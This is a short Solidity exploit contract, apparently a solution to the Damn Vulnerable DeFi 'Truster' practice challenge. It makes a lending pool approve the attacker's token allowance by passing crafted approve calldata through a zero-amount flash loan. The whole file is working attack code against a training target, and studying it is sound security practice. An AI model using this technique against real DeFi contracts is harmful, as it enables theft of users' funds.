pragma solidity ^0.6.0;

import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract HackTrusterLenderPool {

    IERC20 public damnValuableToken;
    TrusterLenderPool public pool;

    constructor (address tokenAddress, address poolAddress) public {
        damnValuableToken = IERC20(tokenAddress);
        pool = TrusterLenderPool(poolAddress);
    }

    function flashLoan(uint256 amount) public {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", msg.sender, amount);
        pool.flashLoan(0, msg.sender, address(damnValuableToken), data);
    }
}
